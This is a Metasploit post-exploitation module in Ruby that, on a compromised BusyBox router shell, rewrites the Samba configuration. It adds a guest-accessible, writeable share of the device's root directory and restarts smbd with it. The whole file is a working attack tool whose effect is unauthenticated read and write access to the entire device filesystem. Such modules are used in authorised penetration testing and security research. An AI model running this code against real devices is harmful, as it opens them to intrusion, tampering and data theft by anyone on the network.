##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Busybox

  def initialize
    super(
      'Name'         => 'BusyBox Smb Share Root',
      'Description'  => 'This module will be applied on a session connected
                         to a BusyBox sh shell. The script will modify the
                         smb configuration of the the router or device executing
                         BusyBox to share the root directory of the device.',
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          [ 'URL', 'http://vallejo.cc']
        ],
      'Platform'      => ['linux'],
       'SessionTypes'  => ['shell']
    )
  end

  def run
    vprint_status("Trying to find smb.conf.")
    if read_file("/var/samba/smb.conf").length > 0 #file? doesnt work because test -f is not implemented in busybox
      vprint_status("Smb.conf found.")
      vprint_status("Trying to find writable directory.")
      writable_directory = get_writable_directory()
      if writable_directory
        vprint_status("writable directory found, copying smb.conf.")
        vprint_status(cmd_exec("rm -f #{writable_directory}smb.conf")); Rex::sleep(0.1)
        vprint_status(cmd_exec("cp -f /var/samba/smb.conf #{writable_directory}smb.conf")); Rex::sleep(0.1)
        vprint_status(cmd_exec("echo -e '[rootdir]\ncomment = rootdir\npath = /\nbrowseable = yes\nwriteable = yes\nguest ok = yes\n' >> #{writable_directory}smb.conf")); Rex::sleep(0.1)
        vprint_status(cmd_exec("killall smbd")); Rex::sleep(0.1)
        vprint_status(cmd_exec("smbd -D -s #{writable_directory}smb.conf")); Rex::sleep(0.1)
        vprint_status(cmd_exec("smbd -D -s=#{writable_directory}smb.conf")); Rex::sleep(0.1)
        print_good("Smb configuration has been modified.")
      else
        print_error("Writable directory not found.")
      end
    else
      print_error("Smb.conf not found.")
    end
  end

end
